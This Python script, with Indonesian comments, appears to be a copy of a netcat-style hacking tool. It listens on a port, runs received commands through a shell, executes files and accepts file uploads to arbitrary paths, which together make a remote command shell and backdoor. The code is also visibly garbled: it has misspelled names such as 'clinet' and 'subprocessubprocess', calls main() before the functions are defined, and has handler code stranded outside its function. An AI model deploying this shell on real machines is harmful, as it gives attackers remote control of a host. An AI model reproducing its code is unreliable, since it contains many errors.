import sys
import socket
import getopt
import threading
import subprocess

#defini sama global variablenya
listen       = False
command      = False
upload       = False
execute      = ""
target       = ""
upload_destination = ""
port         = []

def usage():
    print("this tool example command")
    print()
    print("gunakan perintah ./netcat-reverse.py -t target -p port")
    print("-l listen            -l listen to host")
    print("-e --execute-file to run  - execute the given file upon tersebut")
    print("-c command     - dari intial command shell netcat")
    print("-u upload destinition - connect destinition membuat file dan upload")
    print("example")
    print("sudo python netcat-reverse.py -t 192.168.1.1 -p 5555 -l -o")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #baca command itu tersebut
    try:
            opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
            ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-o","--commandshell"):
            command = True
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"


    #mendengar data yang terkirim
    if not listen and len(target) and port > 0:

        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server.loop()

main()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
         clinet.connect((target,port))

         if len(buffer):
             client.send(buffer)
         while True:
             recv_len = 1
             response = ""

             while recv_len:

                 data     = client.recv(4096)
                 recv_len = len(data)
                 response+= data

                 if recv_len < 4096:
                     break
             print(response)

             buffer = raw_input("")

             buffer += "\n"
             client_send(buffer)
    except:
        print("expectationnya exit")

        client.close()

def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler,
        args=(client_socket))
        client_thread.start()

def run_command(command):

    command = command.rstrip()

    try:
        output = subprocess.check_output(command,stderr=subprocessubprocess.
        STDOUT,shell=true)
    except:
        output = "gagal execute command. \r\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):

        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("success menyimpan file fi \s\r\n" % upload_destination)
        except:
            client_socket.send("failed menyimpan file %\s\r\n" % upload_destination)

if len(execute):

    output = run_command(execute)

    client_socket.send(output)

if command:

    while True:
        client_socket.send("<BHP:#> ")


        cmd_buffer = ""
        while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)

        response = run_command(cmd_buffer)

        client_socket.send(response)